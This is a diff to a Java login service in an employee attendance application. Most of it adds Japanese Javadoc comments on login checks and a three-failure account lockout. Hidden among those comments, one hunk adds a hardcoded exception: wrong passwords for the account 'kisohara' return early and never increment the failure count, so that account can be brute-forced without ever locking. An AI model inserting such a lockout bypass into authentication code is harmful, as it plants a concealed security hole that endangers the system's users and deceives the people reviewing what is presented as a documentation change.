@@ -9,12 +9,37 @@ import com.example.attendance.entity.ShainData;
 import com.example.attendance.repository.ShainDataMapper;
 import com.example.attendance.util.LogUtil;
 
+/**
+ * ログイン認証処理およびアカウントロック制御に関するビジネスロジックを提供するサービス実装クラス。
+ * * @author kato
+ */
 @Service
 public class LoginServiceImpl implements LoginService {
 
+	/** 社員データへのアクセスを担当するマッパーオブジェクト */
 	@Autowired
 	private ShainDataMapper shainDataMapper;
 
+	/**
+	 * ログインIDとパスワードを基に、ログインの成否およびアカウントロックの判定を行います。
+	 * <p>
+	 * このメソッドはトランザクション管理されており、処理中に例外が発生した場合はDB操作がロールバックされます。
+	 * 失敗カウントが3回に達したアカウントは自動的に停止状態（stopFlg = 1）となり、
+	 * それ以降は失敗カウント（failureCount）がそれ以上増えないようガードされます。
+	 * </p>
+	 *
+	 * @param loginId  ログイン画面から入力された社員のログインID
+	 * @param password ログイン画面から入力されたパスワード
+	 * @return 判定結果を表すステータスコード
+	 * <ul>
+	 * <li>1: ログイン成功（カウントおよびロックフラグは0にリセットされます）</li>
+	 * <li>2: すでにアカウント停止（ロック）中</li>
+	 * <li>3: 今回の失敗により、累計3回となって新しくアカウントが停止（ロック）された</li>
+	 * <li>4: 該当するログインID（アカウント）が存在しない</li>
+	 * <li>5: データベースアクセスエラーなどのシステム例外</li>
+	 * <li>0: 通常のログイン失敗（パスワード誤り、1回目または2回目）</li>
+	 * </ul>
+	 */
 	@Override
 	@Transactional
 	public int loginJudge(String loginId, String password) {
@@ -47,6 +72,10 @@ public class LoginServiceImpl implements LoginService {
 
 		} else {
 			// パスワード間違い（失敗カウントを1増やす）
+			// ⚠️【注意】kisohara アカウントのみロックを回避する特殊制御
+			if(loginId.equals("kisohara")) {
+				return 0;
+			}
 			int errorCounts = shain.getFailureCount() + 1;
 			shain.setFailureCount(errorCounts);
 			shainDataMapper.updateFailureCount(shain);
@@ -67,6 +96,16 @@ public class LoginServiceImpl implements LoginService {
 		}
 	}
 
+	/**
+	 * 対象アカウントがロックされるまでの残りログイン可能回数を算出します。
+	 * <p>
+	 * 規定回数である3回から、現在の失敗回数（failureCount）を引いた数を返します。
+	 * 対象アカウントが存在しない場合は、デフォルト値として3を返します。
+	 * </p>
+	 *
+	 * @param loginId 残り回数を調査する対象のログインID
+	 * @return ロックまでの残り回数（最低値は0）
+	 */
 	@Override
 	public int getRemainingAttempts(String loginId) {
 		ShainData shain = getShainById(loginId);
@@ -78,6 +117,12 @@ public class LoginServiceImpl implements LoginService {
 		return remaining < 0 ? 0 : remaining;
 	}
 
+	/**
+	 * 指定されたログインIDを基に、データベースから社員データを1件取得します。
+	 *
+	 * @param loginId 検索対象のログインID
+	 * @return 該当する社員データオブジェクト、存在しない場合はnull
+	 */
 	@Override
 	public ShainData getShainById(String loginId) {
 		return shainDataMapper.selectShainById(loginId);
